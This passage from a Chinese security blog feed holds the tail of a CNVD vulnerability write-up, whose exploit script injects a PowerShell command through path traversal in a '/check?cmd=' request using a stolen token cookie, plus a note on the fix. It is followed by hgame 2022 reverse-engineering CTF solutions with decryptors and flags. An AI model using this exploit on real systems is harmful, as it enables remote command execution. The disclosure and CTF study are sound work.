class="string">&quot;max-age=0&quot;</span>&#125;</span><br><span class="line">res = json.loads(session.get(burp0_url, headers=burp0_headers).text)</span><br><span class="line">token = res.get(<span class="string">&#x27;verify_string&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;[*] Token get: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(token))</span><br><span class="line"></span><br><span class="line">check_header=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;host&quot;</span> : <span class="string">&quot;192.168.0.189:49709&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;CID=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(token)  &#125;</span><br><span class="line">check_url=<span class="string">&quot;http://&quot;</span>+host+<span class="string">&quot;/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+&quot;</span>+cmd</span><br><span class="line">resposen=requests.get(check_url,headers=check_header).text</span><br><span class="line">print(resposen)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>肯定就是修复action=verify-haras了，修改成不会返回cid。然后我去更新了下，发现upx不能脱壳了，手脱壳后找不到关键词，并且日志也不在记录那个端口，远程连接需要先创号。</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNVD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame 2022 re wp</title>
      <link href="2022/02/25/hgame%202022%20Re/"/>
      <url>2022/02/25/hgame%202022%20Re/</url>
      
        <content type="html"><![CDATA[<h1 id="hgame-2022-re-wp"><a href="#hgame-2022-re-wp" class="headerlink" title="hgame 2022 re wp"></a>hgame 2022 re wp</h1><p>1个月的hagme，时间还是比较长，但实际上做题的时间还是不长。</p><p>week3和week4的最后道re没做起，比较可惜，主要是没找到切入点，而且如果分析起来也很花费时间。</p><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><p>16位汇编，逻辑比较简单，就是单字节挨个加密，左4bit位和右4bit位交换位置，然后再异或0x17。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[<span class="number">29</span>]=&#123; <span class="number">0x91</span>, <span class="number">0x61</span>, <span class="number">0x01</span>, <span class="number">0xC1</span>, <span class="number">0x41</span>, <span class="number">0xA0</span>, <span class="number">0x60</span>, <span class="number">0x41</span>, <span class="number">0xD1</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0xC1</span>, <span class="number">0x41</span>, <span class="number">0xE2</span>, <span class="number">0x50</span>, <span class="number">0xE1</span>, <span class="number">0xE2</span>, <span class="number">0x54</span>, <span class="number">0x20</span>, <span class="number">0xC1</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x30</span>, <span class="number">0xD1</span>, <span class="number">0x51</span>, <span class="number">0xC0</span>, <span class="number">0x17</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  enc[i]=enc[i]^<span class="number">0x17</span>;</span><br><span class="line">  enc[i]=((enc[i]&lt;&lt;<span class="number">4</span>)|(enc[i]&gt;&gt;<span class="number">4</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,enc[i]);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//hgame&#123;welc0me_to_4sm_w0rld&#125; </span></span><br></pre></td></tr></table></figure><h3 id="creakme"><a href="#creakme" class="headerlink" title="creakme"></a>creakme</h3><p>魔改tea加密，base64的表作为key，实际上用不完。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *flag , <span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,sum=<span class="number">0</span>,i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x12345678</span>;</span><br><span class="line">    v1=flag[<span class="number">0</span>];</span><br><span class="line">    v0=flag[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += <span class="number">0x12345678</span>;</span><br><span class="line">      v1 += sum ^ (sum + v0) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v0) ^ (key[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">      v0 += sum ^ (sum + v1) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * v1) ^ (key[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    flag[<span class="number">0</span>]=v1;</span><br><span class="line">    flag[<span class="number">1</span>]=v0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *code , <span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x12345678</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,sum=delta*<span class="number">32</span>,i;<span class="comment">// sum=0xC6EF3720</span></span><br><span class="line"></span><br><span class="line">    v1=code[<span class="number">0</span>];</span><br><span class="line">    v0=code[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    v0 -= sum ^ (sum + v1) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * v1) ^ (key[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        v1 -= sum ^ (sum + v0) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v0) ^ (key[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum-=delta;</span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=v1;</span><br><span class="line">    code[<span class="number">1</span>]=v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>]=&#123;<span class="number">0x44434241</span>, <span class="number">0x48474645</span>, <span class="number">0x4C4B4A49</span>, <span class="number">0x504F4E4D</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">16</span>]=&#123;<span class="number">0x48D93488</span>, <span class="number">0x030C144C</span>, <span class="number">0x52EB78C2</span>, <span class="number">0xED9CE5ED</span>, <span class="number">0xAE1FEDE6</span>, <span class="number">0xBA5A126D</span>, <span class="number">0xCF9284AA</span>, <span class="number">0x65E0F2E3</span>, </span><br><span class="line">    <span class="number">0x7C836C08</span>, <span class="number">0xD1A971F3</span>, <span class="number">0xDBBF482D</span>, <span class="number">0x31ED1AE9</span>, <span class="number">0xDBBF482D</span>, <span class="number">0x31ED1AE9</span>, <span class="number">0xD6683289</span>, <span class="number">0x6EAD3693</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">    &#123;  </span><br><span class="line">    decrypt(&amp;code[i*<span class="number">2</span>],key);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//printf(&quot;%08x:&quot;,code[i]);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">0</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">1</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">2</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#hgame&#123;H4ppy_v4c4ti0n!&#125; </span></span><br></pre></td></tr></table></figure><h3 id="Flag-Checker"><a href="#Flag-Checker" class="headerlink" title="Flag Checker"></a>Flag Checker</h3><p>安卓逆向，调用了加密库中rc4加密，找到key，用网站或者脚本解即可。<br><img src="https://s2.loli.net/2022/02/23/NcfgiexblKjVPTk.png"></p><h3 id="猫头鹰是不是猫"><a href="#猫头鹰是不是猫" class="headerlink" title="猫头鹰是不是猫"></a>猫头鹰是不是猫</h3><p>线性代数的矩阵乘法，调用了两次，都是64<em>64的矩阵乘1</em>64的矩阵。其中i&lt;&lt;8的意思实际上就是在取行。</p><p>由于数据太多，z3无法使用，考虑用sage。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#https://sagecell.sagemath.org/</span></span><br><span class="line"></span><br><span class="line">A=Matrix([[<span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">21</span>, <span class="number">19</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>], [<span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>], [<span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">22</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>], [<span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>], [<span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>], [<span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span 